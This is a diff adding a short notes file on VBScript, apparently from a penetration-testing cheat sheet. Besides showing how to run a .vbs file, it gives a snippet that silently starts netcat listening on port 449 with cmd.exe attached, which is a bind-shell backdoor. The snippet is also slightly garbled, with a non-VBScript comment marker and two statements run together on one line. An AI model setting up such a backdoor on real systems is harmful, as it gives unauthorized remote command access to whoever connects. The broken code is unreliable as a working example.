@@ -1,0 +1,13 @@
+# VBS (Visual Basic Script?)
+
+# Execute a vbs
+wscript scriptname.vbs
+
+
+# Execute a program (netcat) in background
+;; here we open a netcat on UDP port 449 in background
+Dim objShellSet objShell = WScript.CreateObject("WScript.shell")
+objShell.run "C:\Windows\system32\nc.exe -Ldp 449 -e cmd.exe"
+Set objShell = Nothing
+
+
